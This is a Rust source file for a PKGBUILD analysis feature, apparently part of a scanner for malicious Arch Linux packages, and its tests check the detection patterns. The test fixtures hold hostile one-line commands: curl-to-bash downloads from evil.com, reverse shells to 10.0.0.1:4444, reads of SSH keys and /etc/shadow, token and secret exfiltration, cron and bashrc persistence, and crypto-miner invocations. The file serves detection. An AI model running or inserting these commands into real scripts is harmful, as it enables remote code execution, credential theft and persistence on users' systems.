pub mod patterns;

use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::scoring::{Signal, SignalCategory};

pub struct PkgbuildAnalysis;

impl Feature for PkgbuildAnalysis {
    fn name(&self) -> &str {
        "pkgbuild_analysis"
    }

    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let Some(ref content) = ctx.pkgbuild_content else {
            return Vec::new();
        };

        let compiled = patterns::compiled_patterns();
        let mut signals = Vec::new();

        for pat in compiled {
            if pat.regex.is_match(content) {
                signals.push(Signal {
                    id: pat.id.clone(),
                    category: SignalCategory::Pkgbuild,
                    points: pat.points,
                    description: pat.description.clone(),
                    is_override_gate: pat.override_gate,
                });
            }
        }

        signals
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: Some(content.into()),
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
        };
        PkgbuildAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
    }

    fn has(ids: &[String], id: &str) -> bool {
        ids.iter().any(|s| s == id)
    }

    // --- Download-and-execute (override gates) ---

    #[test]
    fn curl_pipe() {
        let ids = analyze("curl -s https://evil.com/x | bash");
        assert!(has(&ids, "P-CURL-PIPE"));
    }

    #[test]
    fn wget_pipe() {
        let ids = analyze("wget -q https://evil.com/x | sh");
        assert!(has(&ids, "P-WGET-PIPE"));
    }

    #[test]
    fn curl_pipe_python() {
        let ids = analyze("curl https://evil.com/x | python3");
        assert!(has(&ids, "P-CURL-PIPE-PYTHON"));
    }

    #[test]
    fn curl_pipe_perl() {
        let ids = analyze("curl https://evil.com/x | perl");
        assert!(has(&ids, "P-CURL-PIPE-PERL"));
    }

    #[test]
    fn wget_pipe_python() {
        let ids = analyze("wget https://evil.com/x | python");
        assert!(has(&ids, "P-WGET-PIPE-PYTHON"));
    }

    #[test]
    fn source_remote() {
        let ids = analyze("source <(curl https://evil.com/env.sh)");
        assert!(has(&ids, "P-SOURCE-REMOTE"));
    }

    #[test]
    fn python_exec_url() {
        let ids = analyze("exec(urlopen('https://evil.com/payload.py').read())");
        assert!(has(&ids, "P-PYTHON-EXEC-URL"));
    }

    // --- Reverse shells ---

    #[test]
    fn revshell_devtcp() {
        let ids = analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(has(&ids, "P-REVSHELL-DEVTCP"));
    }

    #[test]
    fn revshell_nc() {
        let ids = analyze("nc -e /bin/sh 10.0.0.1 4444");
        assert!(has(&ids, "P-REVSHELL-NC"));
    }

    #[test]
    fn revshell_socat() {
        let ids = analyze("socat TCP:10.0.0.1:4444 EXEC:/bin/sh");
        assert!(has(&ids, "P-REVSHELL-SOCAT"));
    }

    #[test]
    fn revshell_python() {
        let ids = analyze("import socket; s=socket.socket(); s.connect(('10.0.0.1',4444)); import subprocess");
        assert!(has(&ids, "P-REVSHELL-PYTHON"));
    }

    // --- Obfuscation ---

    #[test]
    fn eval_base64() {
        let ids = analyze("eval $(echo payload | base64 -d)");
        assert!(has(&ids, "P-EVAL-BASE64"));
    }

    #[test]
    fn base64_decode() {
        let ids = analyze("echo data | base64 -d > out");
        assert!(has(&ids, "P-BASE64"));
    }

    #[test]
    fn eval_var() {
        let ids = analyze("eval \"$payload\"");
        assert!(has(&ids, "P-EVAL-VAR"));
    }

    #[test]
    fn gzip_exec() {
        let ids = analyze("zcat payload.gz | bash");
        assert!(has(&ids, "P-GZIP-EXEC"));
    }

    #[test]
    fn python_inline() {
        let ids = analyze("python3 -c 'import os; os.system(\"id\")'");
        assert!(has(&ids, "P-PYTHON-INLINE"));
    }

    #[test]
    fn python_dynamic_import() {
        let ids = analyze("__import__('os').system('id')");
        assert!(has(&ids, "P-PYTHON-DYNAMIC-IMPORT"));
    }

    #[test]
    fn python_exec_compound() {
        let ids = analyze("python3 -c \"exec(open('payload.py').read())\"");
        assert!(has(&ids, "P-PYTHON-EXEC-COMPOUND"));
    }

    // --- Credential theft ---

    #[test]
    fn ssh_access() {
        let ids = analyze("cat ~/.ssh/id_rsa");
        assert!(has(&ids, "P-SSH-ACCESS"));
    }

    #[test]
    fn browser_data() {
        let ids = analyze("cp -r ~/.config/google-chrome/ /tmp/loot");
        assert!(has(&ids, "P-BROWSER-DATA"));
    }

    #[test]
    fn gpg_access() {
        let ids = analyze("tar czf keys.tar.gz ~/.gnupg/");
        assert!(has(&ids, "P-GPG-ACCESS"));
    }

    #[test]
    fn passwd_read() {
        let ids = analyze("cat /etc/shadow");
        assert!(has(&ids, "P-PASSWD-READ"));
    }

    #[test]
    fn clipboard_read() {
        let ids = analyze("xclip -selection clipboard -o");
        assert!(has(&ids, "P-CLIPBOARD-READ"));
    }

    #[test]
    fn disk_read() {
        let ids = analyze("dd if=/dev/sda of=/tmp/dump bs=512 count=1");
        assert!(has(&ids, "P-DISK-READ"));
    }

    // --- Persistence ---

    #[test]
    fn profile_mod() {
        let ids = analyze("echo 'malware' >> ~/.bashrc");
        assert!(has(&ids, "P-PROFILE-MOD"));
    }

    #[test]
    fn systemd_create() {
        let ids = analyze("systemctl enable evil.service");
        assert!(has(&ids, "P-SYSTEMD-CREATE"));
    }

    #[test]
    fn cron_create() {
        let ids = analyze("echo '*/5 * * * * /tmp/payload' | crontab -");
        assert!(has(&ids, "P-CRON-CREATE"));
    }

    #[test]
    fn ld_preload() {
        let ids = analyze("LD_PRELOAD=/tmp/evil.so ./target");
        assert!(has(&ids, "P-LD-PRELOAD"));
    }

    #[test]
    fn nohup_background() {
        let ids = analyze("nohup /tmp/miner &");
        assert!(has(&ids, "P-NOHUP-BACKGROUND"));
    }

    // --- Privilege escalation ---

    #[test]
    fn suid_bit() {
        let ids = analyze("chmod +s /usr/bin/evil");
        assert!(has(&ids, "P-SUID-BIT"));
    }

    #[test]
    fn mkfifo() {
        let ids = analyze("mkfifo /tmp/pipe");
        assert!(has(&ids, "P-MKFIFO"));
    }

    // --- C2 / Exfiltration ---

    #[test]
    fn discord_webhook() {
        let ids = analyze("curl https://discord.com/api/webhooks/123/ABC");
        assert!(has(&ids, "P-DISCORD-WEBHOOK"));
    }

    #[test]
    fn url_shortener() {
        let ids = analyze("curl https://bit.ly/malware");
        assert!(has(&ids, "P-URL-SHORTENER"));
    }

    #[test]
    fn openssl_client() {
        let ids = analyze("openssl s_client -connect evil.com:443");
        assert!(has(&ids, "P-OPENSSL-CLIENT"));
    }

    #[test]
    fn devnull_background() {
        let ids = analyze("curl http://evil.com/beacon >/dev/null 2>&1 &");
        assert!(has(&ids, "P-DEVNULL-BACKGROUND"));
    }

    #[test]
    fn dns_exfil() {
        let ids = analyze("dig $encoded_data.attacker.com");
        assert!(has(&ids, "P-DNS-EXFIL"));
    }

    #[test]
    fn curl_post_data() {
        let ids = analyze("curl -d $secret https://evil.com/collect");
        assert!(has(&ids, "P-CURL-POST-DATA"));
    }

    // --- Crypto mining ---

    #[test]
    fn miner_binary() {
        let ids = analyze("./xmrig --config=pool.json");
        assert!(has(&ids, "P-MINER-BINARY"));
    }

    #[test]
    fn stratum_url() {
        let ids = analyze("stratum+tcp://pool.example.com:3333");
        assert!(has(&ids, "P-STRATUM-URL"));
    }

    #[test]
    fn mining_pool() {
        let ids = analyze("--pool moneroocean.stream:10001");
        assert!(has(&ids, "P-MINING-POOL"));
    }

    #[test]
    fn crypto_wallet() {
        let ids = analyze("--wallet 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A");
        assert!(has(&ids, "P-CRYPTO-WALLET"));
    }

    // --- Download chains ---

    #[test]
    fn chmod_exec_chain() {
        let ids = analyze("chmod +x payload && ./payload");
        assert!(has(&ids, "P-CHMOD-EXEC-CHAIN"));
    }

    #[test]
    fn wget_chmod_exec() {
        let ids = analyze("curl -o backdoor https://evil.com/bd && chmod +x backdoor");
        assert!(has(&ids, "P-WGET-CHMOD-EXEC"));
    }

    #[test]
    fn tmp_execution() {
        let ids = analyze("chmod +x /tmp/payload");
        assert!(has(&ids, "P-TMP-EXECUTION"));
    }

    #[test]
    fn archive_exec() {
        let ids = analyze("tar xf payload.tar.gz && ./setup");
        assert!(has(&ids, "P-ARCHIVE-EXEC"));
    }

    // --- Obfuscation (new) ---

    #[test]
    fn printf_hex() {
        let ids = analyze(r"printf '\x63\x75\x72\x6c\x20'");
        assert!(has(&ids, "P-PRINTF-HEX"));
    }

    #[test]
    fn xxd_decode() {
        let ids = analyze("xxd -r payload.hex > payload.bin");
        assert!(has(&ids, "P-XXD-DECODE"));
    }

    // --- Kernel modules ---

    #[test]
    fn kernel_module_load() {
        let ids = analyze("insmod evil.ko");
        assert!(has(&ids, "P-KERNEL-MODULE-LOAD"));
    }

    #[test]
    fn kernel_module_write() {
        let ids = analyze("cp evil.ko /lib/modules/$(uname -r)/");
        assert!(has(&ids, "P-KERNEL-MODULE-WRITE"));
    }

    // --- Other ---

    #[test]
    fn pastebin_code() {
        let ids = analyze("curl -s https://ptpb.pw/~x | bash");
        assert!(has(&ids, "P-PASTEBIN-CODE"));
    }

    #[test]
    fn sysinfo_recon() {
        let ids = analyze("uname -a > /tmp/info");
        assert!(has(&ids, "P-SYSINFO-RECON"));
    }

    #[test]
    fn env_token_access() {
        let ids = analyze("echo $GITHUB_TOKEN | curl -d @- https://evil.com");
        assert!(has(&ids, "P-ENV-TOKEN-ACCESS"));
    }

    // --- False positive check ---

    #[test]
    fn benign_pkgbuild_no_signals() {
        let ids = analyze(r#"
pkgname=yay
pkgver=12.4.2
pkgrel=1
arch=('x86_64')
depends=('pacman' 'git')
makedepends=('go')
source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/v${pkgver}.tar.gz")
sha256sums=('abc123def456')

build() {
    cd "$pkgname-$pkgver"
    export CGO_CPPFLAGS="${CPPFLAGS}"
    export GOFLAGS="-buildmode=pie -trimpath"
    go build
}

package() {
    install -Dm755 yay "${pkgdir}/usr/bin/yay"
}
"#);
        assert!(ids.is_empty(), "Benign PKGBUILD should trigger no signals, got: {ids:?}");
    }
}
